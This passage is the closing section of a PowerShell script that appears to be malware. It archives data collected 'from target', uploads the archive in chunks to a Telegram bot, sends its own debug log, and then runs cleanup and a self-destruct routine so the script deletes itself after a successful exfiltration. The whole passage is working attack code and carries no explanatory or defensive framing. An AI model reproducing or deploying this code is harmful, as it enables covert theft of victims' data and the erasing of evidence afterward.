        Write-DebugLog "Creating archive..."
        $zips = New-SimpleZip -SourceDir $T36R_OutputDir -ZipPath $T36R_ZipPath
        
        if($zips -and $zips.Count -gt 0) {
            Write-DebugLog "Transmitting data..."
            
            # Send info message about chunks if multiple files
            if($zips.Count -gt 1) {
                Send-Telegram "📦 Sending data in $($zips.Count) parts due to size limit..."
            }
            
            $successCount = 0
            for($i = 0; $i -lt $zips.Count; $i++) {
                $zip = $zips[$i]
                if(Test-Path $zip) {
                    $zipSize = [Math]::Round((Get-Item $zip).Length / 1MB, 2)
                    $partInfo = if($zips.Count -gt 1) { " [Part $($i + 1)/$($zips.Count)]" } else { "" }
                    
                    $success = Send-Telegram -Text "📦 Data package$partInfo ($zipSize MB)" -FilePath $zip
                    if($success) {
                        Write-DebugLog "Successfully transmitted: $zip"
                        $successCount++
                    } else {
                        Write-DebugLog "Failed to transmit: $zip"
                    }
                    
                    # Small delay between chunks to avoid rate limiting
                    if($i -lt ($zips.Count - 1)) {
                        Start-Sleep 2
                    }
                }
            }
            
            # Send completion summary
            if($successCount -eq $zips.Count) {
                Send-Telegram "✅ All $successCount parts transmitted successfully"
                
                # Transmit debug log
                if(Test-Path $T36R_LogPath) {
                    Send-Telegram -Text "📋 Debug Log" -FilePath $T36R_LogPath | Out-Null
                }
                
                # Basic cleanup first
                Invoke-Cleanup
                
                # Initiate self-destruct sequence
                Invoke-SelfDestruct
                
            } else {
                Send-Telegram "⚠️ Transmitted $successCount of $($zips.Count) parts"
                # Don't self-destruct on partial failure
                Invoke-Cleanup
            }
        } else {
            Send-Telegram "❌ Archive creation failed"
        }
    } else {
        Write-DebugLog "No data collected"
        Send-Telegram "⚠️ No data collected from target"
    }
    
    # If we reach here without self-destructing, send completion message
    Write-DebugLog "=== SCRIPT EXECUTION COMPLETED ==="
    Send-Telegram "✅ Script execution completed"
    
} catch {
    $errorMsg = "Script failed: $($_.Exception.Message)"
    Write-DebugLog $errorMsg
    Send-Telegram -Text $errorMsg
    
    # Send debug log on failure
    if(Test-Path $T36R_LogPath) {
        Send-Telegram -Text "📋 Debug Log (Error)" -FilePath $T36R_LogPath | Out-Null
    }
} finally {
    if($mutex) { 
        $mutex.ReleaseMutex()
        $mutex.Dispose() 
    }
    # Only basic cleanup if not self-destructing
    Invoke-Cleanup
}
#endregion